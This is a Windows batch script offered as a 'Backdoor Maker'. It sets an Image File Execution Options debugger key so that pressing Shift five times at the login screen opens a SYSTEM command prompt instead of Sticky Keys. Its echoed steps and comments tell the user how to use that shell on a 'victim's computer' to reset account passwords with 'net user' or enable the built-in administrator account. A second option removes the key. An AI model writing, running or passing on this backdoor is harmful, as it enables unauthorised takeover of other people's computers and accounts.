@echo off
color 0a
title Microsoft_Windows Backdoor Maker
mode 90,7
echo Open Administreter mode only.
ping localhost -w 10000 >nul
:0
cls
echo 1.Make && echo 2.Delete
set /p cho=Enter Number: 
if %cho%==1 goto 1
if %cho%==2 goto 2
echo envelide chose && ping localhost -w 4000 >nul && goto 0
:1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
echo Backdoor cration Suscesful
timeout /t 5 /nobreak
cls
echo logoff your computer and login agen your computer.
ping localhost -w 10000 >nul
cls
echo Then press 5 time Shift key.
ping localhost -w 4000 >nul
cls
echo type "net user" and hit Enter.
ping localhost -w 4000 >nul
cls
echo Then type "net user 'username' 'your now password'"
ping localhost -w 4000 >nul
cls
echo or type this: net user administrator /active:yes
ping localhost -w 5000 >nul
exit
:: if BackDoor Cration susesfule on victim's computer.
:: then logoff your computer and login agen your computer.
:: then press 5 time Shift key or press Alt + Shift + PrintScreen key.
:: A command promt window will prompt with system privilages because on account is logged in.
:: New to change windows account password type this command:
:: net user 
:: net user 'username' 'your now password
:: or type this: net user administrator /active:yes
:2
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
echo Backdoor Deleted
ping localhost -w 4000 >nul
exit

